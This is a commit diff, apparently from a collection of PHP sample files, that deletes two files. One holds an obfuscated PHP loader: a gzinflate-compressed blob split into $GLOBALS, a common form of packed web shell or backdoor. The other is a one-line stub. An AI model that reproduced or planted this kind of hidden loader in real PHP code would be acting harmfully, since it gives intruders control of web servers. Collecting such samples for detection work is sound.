a18aed8256f74ccb477eb5cecc497f4985b21cd4
sonarcloud.py <sonarcloud@localhost>
2024-07-03 11:09:51 +0200

    Revert, [skip actions].

--- 177c2afe3c618f4e16b3978b09b3d57a_original.txt.php
+++
@@ -1,23 +0,0 @@
- error_reporting(E_ALL^E_NOTICE);define('', '');$GLOBALS[] = explode('|||', gzinflate(substr('      
--nEomhCD;gnnd`l	qk1uq#i3?=ACH(QP4
-{t@YWa{>;f
-X.I{i=#\';,qxs$@xW<Q8W%_3HH\'Yeg}zj(Maq9jj)xStBNY82dOP(w%4!!/a9#/0qNKmv jqDZEf/3I8&)`7LQ)w5j"4-p-)mhriN)I^RD<*	/Vry(*QK-SMx
-{#"L&
-jkUQy-\\RV
-Ua_F*%4(U9GkGT\\!0-f&]XAxJ?LTk*9T"6V+OFfbc_U\'4!kRz]5vV]~]B|-*^Xu>r9*8v;NYf_j{U}p<$<
-?2{x,|(dTcP}s=;`<)T@-1 ~Hp{d	 &)JZ@
-kJOYR*+V\'e&e)%52	z&UV<%0pS 6Iw\'~wb){	34Qp&~KQ~?"RD-"W#L1&z
-`SS\\e>GOw7TYy&+
-m:SpUj.BW{+J0B(`\'3s9"j##%ki_tTzR=2C{VOk6#(jQI`ca},\\PqEZ=`zj(}5
-s8uE.](tcp}xj]0}o^MXYG{j %` rvjU.%s{DNwp@>+nVEK".
-P\'Bt
-&\'vnq_#.C<a!N#ydYE;={8IA:Ot!}2pYJ/nW@aI<=bu@1	.W"r!7@"j-kzAD){OZ*-1<\'3t?W5G@
-B*mt&cD%)LHPK~;~YKjp1Xpa`GV52H6IhW]*e2n:j&[u\'V
-OYWvooB%W1r y"F1ns`*YU{fTP\\v5UM%Oi`}q\'kF}90pA0L67ol
-x\'XwWn=+m[wh;GGNk/[*poHsv>_c]`8eNMug7l4/F2}IPGYKT_o(nzMmVT&2
->sFEaZ:l6UnC$KV( t.0wW#sJ X-+_FmnBvz](oo[Y2K^=w0Pd)83B|C?l+Wh\' ARjFe)b3
-tANJC+dLz9n)=NYN=9
--6UOS6Ut9C3[JID>J6H!	&\\t,0,oqSJ~;V*B[ZvAL{
-	Z9|H\'NFr@@$N3#~(=
-2|F{N))3{IE"1&yB /?!mS/2g,.eopVE;%A\\	F.i)!H~958/\'l~4KCj;e3NfR]E|?x40o}{ixitem`3YpG>QA8y|ImQK;NOd}R#;	Q@rdCjdRS
-o[f,Tcm]wrBsU%vCj0j^!}XGd`f :OIf!!!*
--- 210d9998924f500d176d338a53128c70_original.txt.php
+++
@@ -1,3 +0,0 @@
-<?php
-
-error_reporting(SALAH);
